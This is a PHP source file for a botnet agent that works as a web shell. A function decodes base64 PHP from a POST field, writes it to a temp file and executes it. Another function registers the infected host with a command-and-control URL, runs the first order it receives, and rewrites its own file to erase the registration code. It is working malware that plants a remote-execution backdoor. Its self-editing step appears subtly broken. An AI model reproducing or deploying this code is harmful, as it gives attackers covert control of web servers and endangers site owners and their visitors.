<?php

	// SCENARION :  BOT INFECTED -- > BOT FIRST CONNECTION --> BOT SUCCESSFULL DECLARATION --> BOT DELETE DECLARATION FUNCTION --> BOT LISTEN FOR NEW ORDER -- > BOT EXECUTE ORDER -- > BOT CHANGE LOCATION AND SEND NEW LOCATION LINK 

function execPHP(){
	GLOBAL $_POST ;
	if(isset($_POST['PHPCOMM'])){
		@ob_flush();@ob_start();$file = tempnam(sys_get_temp_dir(), 'GK').".php";
		file_put_contents($file, '<?'.base64_decode(trim($_POST['PHPCOMM'])).'?>');
		include($file);$t = @ob_get_clean();@unlink($file);@ob_end_flush();return $t;
	}

}
//COMMENT OF START
// @ function will be deleted after succefull declaration of the bot

function doDeclaration(){
	// in this part maybe i will use irc public server to send crypted data , for the moment lets keep it simple
	global  $_SERVER ; 
	$masterLink = "http://localhost/m/api.php";
	if(strlen($_SERVER['HTTP_HOST']) != 0)$domaine=$_SERVER['HTTP_HOST'];
    else $domaine = $_SERVER['SERVER_NAME'] ;
    $path = $domaine.$_SERVER['SCRIPT_NAME'];
    $data = "?action=CHECKNEW&&LINK=".urlencode($path);
    $finalLink=$masterLink.$data;
    $response = @file_get_contents($finalLink);
    echo $response;
    $response = json_decode($response , true );
    if($response['status']){
    	// DELETE THIS FUNCTION  AND REPLACE PHPCOMM WITH A HASH STORED IN MASTER DB
    	$name = basename(__FILE__, '.php').".php";
    	$script = @file_get_contents($name);
    	$newscript = explode('//COMMENT OF START', $script) ;
    	$sc = $newscript[0].'execPHP();'.$newscript[3];
    	file_put_contents($name , $sc);
    	//Execute first ORDER [:WHOAMI:]
    	$_POST['PHPCOMM'] =  $response['order'] ;
    	echo execPHP();
    }
    
}
doDeclaration();
//COMMENT OF START

?>